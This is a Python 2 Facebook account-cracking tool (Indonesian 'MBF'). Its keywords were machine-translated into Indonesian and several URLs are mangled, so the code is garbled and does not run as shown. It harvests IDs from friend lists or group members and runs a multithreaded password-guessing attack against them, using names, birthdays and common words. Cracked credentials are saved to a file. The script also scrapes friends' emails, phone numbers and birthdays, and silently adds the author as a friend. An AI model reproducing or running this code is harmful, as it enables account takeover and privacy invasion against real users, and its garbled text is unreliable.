# anonymous
#! / usr / bin / python2
# coding = utf-8


impor os, sys, waktu, datetime, acak, hashlib, re, threading, json, urllib, cookielib, permintaan, mekanisasi
dari multiprocessing.pool import ThreadPool
dari requests.exeption mengimpor ConnectionError
dari mekanis impor Browser


memuat ulang (sys)
sys.setdefaultencoding ('utf8')
br = mechanize.Browser ()
br.set_handle_robots (False)
br.set_handle_refresh (mechanize._http.HTTPRefreshProcessor (), max_time = 1)
br.addheaders = [('User-Agent', 'Opera / 9.80 (Android; Opera Mini / 32.0.2254 / 85. U; id) Presto / 2.12.423 Versi / 12.16')]


def keluar ():
	cetak "\ 033 [1; 96m [!] \ x1b [1; 91mKeluar"
	os.sys.exit ()
	
	
def acak (x):
    w = 'mhkbpcP'
    d = ''
    untuk saya dalam x:
        d + = '!' + w [random.randint (0, len (w) -1)] + i
    return cetak (d)
    
    
def cetak (x):
    w = 'mhkbpcP'
    untuk saya dalam w:
        j = w.index (i)
        x = x.replace ('!% s'% i, '\ 033 [% s; 1m'% str (31 + j))
    x + = '\ 033 [0m'
    x = x.replace ('! 0', '\ 033 [0m')
    sys.stdout.write (x + '\ n')
	

def jalan (z):
	untuk e in z + '\ n':
		sys.stdout.write (e)
		sys.stdout.flush ()
		time.sleep (0,05)
		
		
logo = "" "\ x1b [1; 93m ______ \ x1b [1; 92m _______ \ x1b [1; 94m ______ \ x1b [1; 91m ___ _ \ n \ x1b [1; 93m | | \ x1b [1; 92m | _ | \ x1b [1; 94m | _ | \ x1b [1; 91m | | | | \ n \ x1b [1; 93m | _ | \ x1b [1; 92m | | _ | | x1b [1; 94m | | || | \ x1b [1; 91m | | _ | | \ n \ x1b [1; 93m | | | | \ x1b [1; 92m | | \ x1b [1; 94m | | _ || _ \ x1b [1; 91m | _ | \ n \ x1b [1; 93m | | _ | | \ x1b [1; 92m | | \ x1b [1; 94m | __ | \ x1b [1; 91m | | _ \ n \ x1b [1; 93m | | \ x1b [1; 92m | _ | \ x1b [1; 94m | | | | \ x1b [1; 91m | _ | \ n \ x1b [1; 93m | ______ | \ x1b [1; 92m | __ | | __ | \ x1b [1; 94m | ___ | | _ | \ x1b [1; 91m | ___ | | _ | \ x1b [1; 96mFB \ n \ n \ x1b [1; 95m ● ▬▬▬▬▬▬▬ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ● \ n ✫╬─ \ x1b [1; 92mReCode \ x1b [1; 91m : \ x1b [1; 93mnewbie \ x1b [1; 95m─╬✫ \ n ✫╬─ \ x1b [1; 92mFB \ x1b [1; 92m \ x1b [1; 91m: \ x1b [1; 96mFacebook.com/theomalip \ x1b [1; 95m─╬✫ \ n ✫╬─ \ x1b [1;92mGitHub \ x1b [1; 91m: \ x1b [1; 94mGithub.com/storiku \ x1b [1; 95m─╬✫ \ n ● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ●
"" "

def tik ():
	titik = ['. ',' .. ',' ... ']
	untuk o di titik:
		print ("\ r \ 033 [1; 96m [●] \ x1b [1; 93mSedang masuk \ x1b [1; 97m" + o),; sys.stdout.flush (); time.sleep (1)


kembali = 0
utas = []
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\ 033 [31mNidak Vuln"
vuln = "\ 033 [32mVuln"

def siapa ():
	os.system ('jelas')
	nama = raw_input ("\ 033 [1; 97mSiapa nama kamu? \ 033 [1; 91m: \ 033 [1; 92m")
	jika nama == "":
		cetak "\ 033 [1; 96m [!] \ 033 [1; 91mIsi yang benar"
		time.sleep (1)
		siapa ()
	lain:
		os.system ('jelas')
		jalan ("\ 033 [1; 97mSelamat datang \ 033 [1; 92m" + nama + "\ n \ 033 [1; 97mTerimakasih telah menggunakan alat ini !!")
		time.sleep (1)
		loginSC ()
		
		
def loginSC ():
	os.system ('jelas')
	print "\ 033 [1; 97mSilahkan login SC nya dulu bosque \ n"
	username = raw_input ("\ 033 [1; 96m [*] \ 033 [1; 97mUsername \ 033 [1; 91m: \ 033 [1; 92m")
	kata sandi = raw_input ("\ 033 [1; 96m [*] \ 033 [1; 97mPassword \ 033 [1; 91m: \ 033 [1; 92m")
	jika nama pengguna == "dark" dan kata sandi == "fb":
		cetak "\ 033 [1; 96m [✓] \ 033 [1; 92mLogin berhasil"
		time.sleep (1)
		Gabung()
	lain:
		cetak "\ 033 [1; 96m [!] \ 033 [1; 91mSalah !!"
		time.sleep (1)
                LoginSC ()

def login ():
	os.system ('jelas')
	mencoba:
		toket = buka ('login.txt', 'r')
		Tidak bisa() 
	kecuali (KeyError, IOError):
		os.system ('jelas')
		cetak logo
		cetak 42 * "\ 033 [1; 96m ="
		cetak ('\ 033 [1; 96m [☆] \ x1b [1; 93mLOGIN AKUN FACEBOOK ANDA \ x1b [1; 96m [☆]'))
		id = raw_input ('\ 033 [1; 96m [+] \ x1b [1; 93mID / Email \ x1b [1; 91m: \ x1b [1; 92m')
		pwd = raw_input ('\ 033 [1; 96m [+] \ x1b [1; 93mPassword \ x1b [1; 91m: \ x1b [1; 92m')
		tik ()
		mencoba:
			br.open ('https://m.facebook.com')
		kecuali mekanisasi.
			cetak "\ n \ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi"
			keluar ()
		br._factory.is_html = Benar
		br.select_form (nr = 0)
		br.form ['email'] = id
		br.form ['pass'] = pwd
		mengirimkan ()
		url = br.geturl ()
		jika 'save-device' di url:
			mencoba:
				sig = 'api_key = 882a8490361da98702bf97a021ddc14dcredentials_type = kata sandiemail =' + id + 'format = JSONgenerate_machine_id = 1generate_session_cookies = 1locale = en_USmethod = auth.logo04campanye_compartemenempatcampas_campas_data_data_data_data_data_data_data_data_data_data_data_data_data_data_data_data_data_data_data_data_data_data_data_data_nya sudah ada.
				data = {"api_key": "882a8490361da98702bf97a021ddc14d", "credentials_type": "kata sandi", "email": id, "format": "JSON", "menghasilkan_machine_id": "1", "menghasilkan_session_cookies": "1", "," lokal ":" en_US "," metode ":" auth.login "," kata sandi ": pwd," return_ssl_resources ":" 0 "," v ":" 1.0 "}
				x = hashlib.new ("md5")
				x.perbarui (sig)
				a = x.hexdigest ()
				data.update ({'sig': a})
				url = "https://api.facebook.com/restserver.php"
				r = requests.get (url, params = data)
				z = json.loads (r.text)
				unikers = open ("login.txt", 'w')
				unikers.write (z ['access_token'])
				unikers.close ()
				cetak '\ n \ 033 [1; 96m [✓] \ x1b [1; 92mLogin Berhasil'
				requests.post ('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z [' access_token '])
				os.system ('xdg-open https://www.youtube.com/omaliptv')
				Tidak bisa()
			kecuali requests.exceptions.ConnectionError:
				cetak "\ n \ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi"
				keluar ()
		jika 'pos pemeriksaan' di url:
			print ("\ n \ 033 [1; 96m [!] \ x1b [1; 91mungkin akun Anda dan pos pemeriksaan kena")
			os.system ('rm -rf login.txt')
			time.sleep (1)
			keluar ()
		lain:
			cetak ("\ n \ 033 [1; 96m [!] \ x1b [1; 91mPassword / Email salah")
			os.system ('rm -rf login.txt')
			time.sleep (1)
			Gabung()
			
			
menu def ():
	os.system ('jelas')
	mencoba:
		toket = open ('login.txt', 'r'). read ()
	kecuali IOError:
		os.system ('jelas')
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		keluar ()
	mencoba:
		otw = requests.get ('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads (otw.text)
		nama = a ['name']
		id = a ['id']
	kecuali KeyError:
		os.system ('jelas')
		cetak "\ 033 [1; 96m [!] \ 033 [1; 91mToken tidak valid"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		Gabung()
	kecuali requests.exceptions.ConnectionError:
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi"
		keluar ()
	os.system ("hapus")
	cetak logo
	cetak 42 * "\ 033 [1; 96m ="
	cetak "\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93m Nama \ 033 [1; 91m: \ 033 [1; 92m" + nama + "\ 033 [ 1; 97 m "
	cetak "\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93m ID \ 033 [1; 91m: \ 033 [1; 92m" + id + "\ x1b [ 1; 97 m "
	cetak 42 * "\ 033 [1; 96m ="
	cetak "\ x1b [1; 97m1. \ x1b [1; 93m Hack facebook MBF"
	cetak "\ x1b [1; 97m2. \ x1b [1; 93m Lihat daftar grup"
	cetak "\ x1b [1; 97m3. \ x1b [1; 93m Informasi akun"
	cetak "\ x1b [1; 97m4. \ x1b [1; 93m Yahoo clone"
	cetak "\ n \ x1b [1; 91m0. \ x1b [1; 91m Keluar"
	pilih ()


def pilih ():
	unikers = raw_input ("\ n \ 033 [1; 97m >>> \ 033 [1; 97m")
	jika unikers == "":
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mIsi yang benar"
		pilih ()
	elif unikers == "1":
		super()
	elif unikers == "2":
		grupsaya ()
	elif unikers == "3":
		informasi ()
	elif unikers == "4":
		yahoo ()
	elif unikers == "0":
		os.system ('jelas')
		jalan ('Menghapus token')
		os.system ('rm -rf login.txt')
		keluar ()
	lain:
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mIsi yang benar"
		pilih ()
		
		
def super ():
	toket global
	os.system ('jelas')
	mencoba:
		toket = open ('login.txt', 'r'). read ()
	kecuali IOError:
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		keluar ()
	os.system ('jelas')
	cetak logo
	cetak 42 * "\ 033 [1; 96m ="
	cetak "\ x1b [1; 97m1. \ x1b [1; 93m Retak dari daftar teman"
	cetak "\ x1b [1; 97m2. \ x1b [1; 93m Retak dari teman"
	cetak "\ x1b [1; 97m3. \ x1b [1; 93m Retak dari anggota grup"
	cetak "\ x1b [1; 97m4. \ x1b [1; 93m Retak dari file"
	cetak "\ n \ x1b [1; 91m0. \ x1b [1; 91m Kembali"
	pilih_super ()

def pilih_super ():
	peak = raw_input ("\ n \ 033 [1; 97m >>> \ 033 [1; 97m")
	jika puncak == "":
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mIsi yang benar"
		pilih_super ()
	elif peak == "1":
		os.system ('jelas')
		cetak logo
		cetak 42 * "\ 033 [1; 96m ="
		jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93mMengambil ID \ 033 [1; 97m ...')
		r = requests.get ("https://graph.facebook.com/me/friends?access_token=" + toket)
		z = json.loads (r.text)
		untuk s in z ['data']:
			id.append (s ['id'])
	elif peak == "2":
		os.system ('jelas')
		cetak logo
		cetak 42 * "\ 033 [1; 96m ="
		idt = raw_input ("\ 033 [1; 96m [+] \ 033 [1; 93mMasukan ID teman \ 033 [1; 91m: \ 033 [1; 97m")
		mencoba:
			jok = requests.get ("https://graph.facebook.com/" + idt + "? access_token =" + toket)
			op = json.loads (jok.text)
			cetak "\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93mNama teman \ 033 [1; 91m: \ 033 [1; 97m" + op ["name" ]
		kecuali KeyError:
			print "\ 033 [1; 96m [!] \ x1b [1; 91mTeman tidak ditemukan!"
			raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
			super()
		jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93mMengambil ID \ 033 [1; 97m ...')
		r = requests.get ("https://graph.facebook.com/" + idt + "/ friends? access_token =" + toket)
		z = json.loads (r.text)
		untuk saya dalam z ['data']:
			id.append (i ['id'])
	elif peak == "3":
		os.system ('jelas')
		cetak logo
		cetak 42 * "\ 033 [1; 96m ="
		idg = raw_input ('\ 033 [1; 96m [+] \ 033 [1; 93mMasukan grup ID \ 033 [1; 91m: \ 033 [1; 97m')
		mencoba:
			r = requests.get ('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw = json.loads (r.text)
			cetak "\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93mNama grup \ 033 [1; 91m: \ 033 [1; 97m" + asw ['name' ]
		kecuali KeyError:
			print "\ 033 [1; 96m [!] \ x1b [1; 91mGroup tidak ditemukan"
			raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
			super()
		jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93mMengambil ID \ 033 [1; 97m ...')
		re = requests.get ('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s = json.loads (re.text)
		untuk p dalam s 'data']:
			id.append (p ['id'])
	elif peak == "4":
		os.system ('jelas')
		cetak logo
		cetak 42 * "\ 033 [1; 96m ="
		mencoba:
			idlist = raw_input ('\ x1b [1; 96m [+] \ x1b [1; 93mMasukan file nama \ x1b [1; 91m: \ x1b [1; 97m')
			untuk baris terbuka (idlist, 'r'). readlines ():
				id.append (line.strip ())
		kecuali IOError:
			cetak '\ x1b [1; 96m [!] \ x1b [1; 91mFile tidak ditemukan'
			raw_input ('\ n \ x1b [1; 96m [\ x1b [1; 97mKembali \ x1b [1; 96m]')
			super()
	elif peak == "0":
		Tidak bisa()
	lain:
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mIsi yang benar"
		pilih_super ()
	
	cetak "\ 033 [1; 96m [+] \ 033 [1; 93mTotal ID \ 033 [1; 91m: \ 033 [1; 97m" + str (len (id))
	titik = ['. ',' .. ',' ... ']
	untuk o di titik:
		cetak ("\ r \ 033 [1; 96m [\ 033 [1; 97m✸ \ 033 [1; 96m] \ 033 [1; 93mCrack \ 033 [1; 97m" + o) ,; sys.stdout.flush ( ); time.sleep (1)
	mencetak
	cetak ('\ x1b [1; 96m [!] \ x1b [1; 93mHentikan CTRL + z')
	cetak 42 * "\ 033 [1; 96m ="
	
			
	def main (arg):
		cekpoint global, oks
		pengguna = arg
		mencoba:
			os.mkdir ('keluar')
		kecuali OSError:
			lulus
		mencoba:
			a = requests.get ('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads (a.text)
			pass1 = b ['first_name'] + '123'
			data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&== password & urus==&&== urellib.urlopen) ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load (data)
			jika 'access_token' di q:
				cetak '\ x1b [1; 96m [✓] \ x1b [1; 92mBERHASIL'
				cetak '\ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 92m' + b ['name']
				cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 92m' + pengguna
				cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 92m' + pass1 + '\ n'
				oks.append (pengguna + pass1)
			lain:
				jika 'www.facebook.com' di q ["error_msg"]:
					cetak '\ x1b [1; 96m [✖] \ x1b [1; 93mCEKPOINT'
					cetak '\ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 93m' + b ['name']
					cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 93m' + pengguna
					cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 93m' + pass1 + '\ n'
					cek = buka ("out / super_cp.txt", "a")
					cek.write ("ID:" + user + "Pw:" + pass1 + "\ n")
					cek.close ()
					cekpoint.append (pengguna + pass1)
				lain:
					pass2 = b ['first_name'] + '12345'
					data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&== password & ur== ur_int_=ion) & urus = user & urus (urus) = password & urus urus == pengguna & urus uret = user & urusup (uruster = password = urus) = data = ur5 ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load (data)
					jika 'access_token' di q:
						cetak '\ x1b [1; 96m [✓] \ x1b [1; 92mBERHASIL'
						cetak '\ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 92m' + b ['name']
						cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 92m' + pengguna
						cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 92m' + pass2 + '\ n'
						oks.append (pengguna + pass2)
					lain:
						jika 'www.facebook.com' di q ["error_msg"]:
							cetak '\ x1b [1; 96m [✖] \ x1b [1; 93mCEKPOINT'
							cetak '\ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 93m' + b ['name']
							cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 93m' + pengguna
							cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 93m' + pass2 + '\ n'
							cek = buka ("out / super_cp.txt", "a")
							cek.write ("ID:" + user + "Pw:" + pass2 + "\ n")
							cek.close ()
							cekpoint.append (pengguna + pass2)
						lain:
							pass3 = b ['last_name'] + '123'
							data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&=" kata sandi + URL) & urus==&&== urson ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load (data)
							jika 'access_token' di q:
								cetak '\ x1b [1; 96m [✓] \ x1b [1; 92mBERHASIL'
								cetak '\ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 92m' + b ['name']
								cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 92m' + pengguna
								cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 92m' + pass3 + '\ n'
								oks.append (pengguna + pass3)
							lain:
								jika 'www.facebook.com' di q ["error_msg"]:
									cetak '\ x1b [1; 96m [✖] \ x1b [1; 93mCEKPOINT'
									cetak '\ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 93m' + b ['name']
									cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 93m' + pengguna
									cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 93m' + pass3 + '\ n'
									cek = buka ("out / super_cp.txt", "a")
									cek.write ("ID:" + user + "Pw:" + pass3 + "\ n")
									cek.close ()
									cekpoint.append (pengguna + pass3)
								lain:
									pass4 = 'Bangsat'
									data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&== password & urus==&&== urellib.urlopen) ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load (data)
									jika 'access_token' di q:
										cetak '\ x1b [1; 96m [✓] \ x1b [1; 92mBERHASIL'
										cetak '\ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 92m' + b ['name']
										cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 92m' + pengguna
										cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 92m' + pass4 + '\ n'
										oks.append (pengguna + pass4)
									lain:
										jika 'www.facebook.com' di q ["error_msg"]:
											cetak '\ x1b [1; 96m [✖] \ x1b [1; 93mCEKPOINT'
											cetak '\ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 93m' + b ['name']
											cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 93m' + pengguna
											cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 93m' + pass4 + '\ n'
											cek = buka ("out / super_cp.txt", "a")
											cek.write ("ID:" + user + "Pw:" + pass4 + "\ n")
											cek.close ()
											cekpoint.append (pengguna + pass4)
										lain:
											ulang tahun = b ['ulang tahun']
											pass5 = birthday.replace ('/', '')
											data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&== password & ur=== urellib) ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load (data)
											jika 'access_token' di q:
												cetak '\ x1b [1; 96m [✓] \ x1b [1; 92mBERHASIL'
												cetak '\ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 92m' + b ['name']
												cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 92m' + pengguna
												cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 92m' + pass5 + '\ n'
												oks.append (pengguna + pass5)
											lain:
												jika 'www.facebook.com' di q ["error_msg"]:
													cetak '\ x1b [1; 96m [✖] \ x1b [1; 93mCEKPOINT'
													cetak '\ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 93m' + b ['name']
													cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 93m' + pengguna
													cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 93m' + pass5 + '\ n'
													cek = buka ("out / super_cp.txt", "a")
													cek.write ("ID:" + user + "Pw:" + pass5 + "\ n")
													cek.close ()
													cekpoint.append (pengguna + pass5)
												lain:
													pass6 = 'Sayang'
													data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&== password & ur=== urellib) ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load (data)
													jika 'access_token' di q:
														cetak '\ x1b [1; 96m [✓] \ x1b [1; 92mBERHASIL'
														cetak '\ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 92m' + b ['name']
														cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 92m' + pengguna
														cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 92m' + pass6 + '\ n'
														oks.append (pengguna + pass6)
													lain:
														jika 'www.facebook.com' di q ["error_msg"]:
															cetak '\ x1b [1; 96m [✖] \ x1b [1; 93mCEKPOINT'
															cetak '\ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 93m' + b ['name']
															cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 93m' + pengguna
															cetak '\ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 93m' + pass6 + '\ n'
															cek = buka ("out / super_cp.txt", "a")
															cek.write ("ID:" + user + "Pw:" + pass6 + "\ n")
															cek.close ()
															cekpoint.append (pengguna + pass6)
		kecuali:
			lulus
		
	p = ThreadPool (30)
	p.map (utama, id)
	cetak '\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mSelesai \ 033 [1; 97m ....'
	cetak "\ 033 [1; 96m [+] \ 033 [1; 92mTotal OK / \ x1b [1; 93mCP \ 033 [1; 91m: \ 033 [1; 92m" + str (len (oks)) + "\ 033 [1; 97m / \ 033 [1; 93m "+ str (len (cekpoint))
	print ("\ 033 [1; 96m [+] \ 033 [1; 92mCP File disimpan \ 033 [1; 91m: \ 033 [1; 97mout / super_cp.txt")
	raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
	super()


def grupsaya ():
	os.system ('jelas')
	mencoba:
		toket = open ('login.txt', 'r'). read ()
	kecuali IOError:
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		keluar ()
	mencoba:
		os.mkdir ('keluar')
	kecuali OSError:
		lulus
	os.system ('jelas')
	cetak logo
	cetak 42 * "\ 033 [1; 96m ="
	mencoba:
		uh = requests.get ('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads (uh.text)
		untuk p in gud ['data']:
			nama = p ["name"]
			id = p ["id"]
			f = terbuka ('out / Grupid.txt', 'w')
			listgrup.append (id)
			f.write (id + '\ n')
			cetak ("\ 033 [1; 96m [✓] \ 033 [1; 92mGROUP SAYA")
			cetak ("\ 033 [1; 96m [➹] \ 033 [1; 97mID \ 033 [1; 91m: \ 033 [1; 92m" + str (id))
			cetak ("\ 033 [1; 96m [➹] \ 033 [1; 97mNama \ 033 [1; 91m: \ 033 [1; 92m" + str (nama) + '\ n')
		cetak 42 * "\ 033 [1; 96m ="
		print "\ 033 [1; 96m [+] \ 033 [1; 92mTotal Grup \ 033 [1; 91m: \ 033 [1; 97m% s"% (len (listgrup))
		cetak ("\ 033 [1; 96m [+] \ 033 [1; 92mPenyimpan \ 033 [1; 91m: \ 033 [1; 97mout / Grupid.txt")
		f.close ()
		raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
		Tidak bisa()
	kecuali (KeyboardInterrupt, EOFError):
		cetak ("\ 033 [1; 96m [!] \ x1b [1; 91mTerhenti")
		raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
		Tidak bisa()
	kecuali KeyError:
		os.remove ('out / Grupid.txt')
		print ('\ 033 [1; 96m [!] \ x1b [1; 91mGroup tidak ditemukan')
		raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
		Tidak bisa()
	kecuali requests.exceptions.ConnectionError:
		print "\ 033 [1; 96m [✖] \ x1b [1; 91mTidak ada koneksi"
		keluar ()
	kecuali IOError:
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mError"
		raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
		Tidak bisa()

def informasi ():
	os.system ('jelas')
	mencoba:
		toket = open ('login.txt', 'r'). read ()
	kecuali IOError:
		cetak "\ 033 [1; 91m [!] Token tidak valid"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		keluar ()
	os.system ('jelas')
	cetak logo
	cetak 42 * "\ 033 [1; 96m ="
	aid = raw_input ('\ 033 [1; 96m [+] \ 033 [1; 93mMasukan ID / Nama \ 033 [1; 91m: \ 033 [1; 97m')
	jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93mTunggu sebentar \ 033 [1; 97m ...')
	r = requests.get ('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads (r.text)
	untuk saya di cok ['data']:
		jika bantuan dalam saya ['nama'] atau bantuan dalam saya ['id']:
			x = requests.get ("https://graph.facebook.com/" + i ['id'] + "? access_token =" + toket)
			z = json.loads (x.text)
			cetak 43 * "\ 033 [1; 96m ="
			mencoba:
				cetak '\ 033 [1; 96m [➹] \ 033 [1; 93mNama \ 033 [1; 97m:' + z ['nama']
			kecuali KeyError: cetak '\ 033 [1; 96m [?] \ 033 [1; 93mNama \ 033 [1; 97m: \ 033 [1; 91mTidak ada'
			mencoba:
				cetak '\ 033 [1; 96m [➹] \ 033 [1; 93mID \ 033 [1; 97m:' + z ['id']
			kecuali KeyError: cetak '\ 033 [1; 96m [?] \ 033 [1; 93mID \ 033 [1; 97m: \ 033 [1; 91mTidak ada'
			mencoba:
				cetak '\ 033 [1; 96m [➹] \ 033 [1; 93mEmail \ 033 [1; 97m:' + z ['email']
			kecuali KeyError: cetak '\ 033 [1; 96m [?] \ 033 [1; 93mEmail \ 033 [1; 97m: \ 033 [1; 91mTidak ada'
			mencoba:
				cetak '\ 033 [1; 96m [➹] \ 033 [1; 93mTidak ada HP \ 033 [1; 97m:' + z ['mobile_phone']
			kecuali KeyError: cetak '\ 033 [1; 96m [?] \ 033 [1; 93mTidak ada HP \ 033 [1; 97m: \ 033 [1; 91mTidak ada'
			mencoba:
				cetak '\ 033 [1; 96m [➹] \ 033 [1; 93mTempat tinggal \ 033 [1; 97m:' + z ['lokasi'] ['nama']
			kecuali KeyError: cetak '\ 033 [1; 96m [?] \ 033 [1; 93mTempat tinggal \ 033 [1; 97m: \ 033 [1; 91mTidak ada'
			mencoba:
				cetak '\ 033 [1; 96m [➹] \ 033 [1; 93mTanggal lahir \ 033 [1; 97m:' + z ['ulang tahun']
			kecuali KeyError: print '\ 033 [1; 96m [?] \ 033 [1; 93mTanggal lahir \ 033 [1; 97m: \ 033 [1; 91mTidak ada'
			mencoba:
				cetak '\ 033 [1; 96m [➹] \ 033 [1; 93mSekolah \ 033 [1; 97m:'
				untuk q dalam z ['pendidikan']:
					mencoba:
